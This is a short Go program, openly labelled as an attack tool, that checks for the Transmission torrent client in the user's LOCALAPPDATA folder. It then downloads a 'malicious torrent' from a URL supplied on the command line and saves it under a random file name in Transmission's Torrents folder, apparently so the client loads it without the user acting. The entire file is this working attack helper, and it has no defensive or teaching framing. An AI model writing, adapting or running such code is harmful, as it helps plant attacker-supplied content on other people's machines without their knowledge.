package main

import (
	"os"
	"github.com/levigross/grequests"
	"fmt"
	"flag"
	"math/rand"
)

// path is the path to transmission's LOCALAPPDATA folder
func verifyTransmissionInstall(path string) bool {
	_, err := os.Stat(path)
	// if the path doesn't exist, we return false
	if os.IsNotExist(err) {
		return false
	// otherwise, we return true (installed)
	} else {
		return true
	}
}

// url is url for malicious torrent
// tPath is path for transmission torrent folder
func downloadMaliciousTorrent(url string, tPath string) {
	torrentName := generateFileName(15) + ".torrent"
	savePath := tPath + "\\" + torrentName
	response, err := grequests.Get(url, nil)
	if err != nil {
		fmt.Println(err)
	}
	fmt.Println("[+] Downloading malicious torrent...")
	err = response.DownloadToFile(savePath)
	if err != nil {
		fmt.Println(err)
	}
	return
}


// generate random filename
func generateFileName(length int) string {
	alphabet := "abcdefghijklmnopqrstuvwxyz1234567890"
	var name string
	for i:=0; i <= length; i++ {
		index := rand.Intn(len(alphabet))
		name = name + string(alphabet[index])
	}
	return name
}

func main() {
	var torrentUrl string
	flag.StringVar(&torrentUrl, "url", "", "The URL to the malicious torrent to install")
	flag.Parse()
	transmissionPath := os.Getenv("LOCALAPPDATA") + "\\transmission"
	// if it returns true, meaning transmission is installed, we continue
	if verifyTransmissionInstall(transmissionPath) {
		tPath := transmissionPath + "\\Torrents"
		downloadMaliciousTorrent(torrentUrl, tPath)
		return
	} else {
		fmt.Println("[!] Transmission not installed!")
		return
	}

}
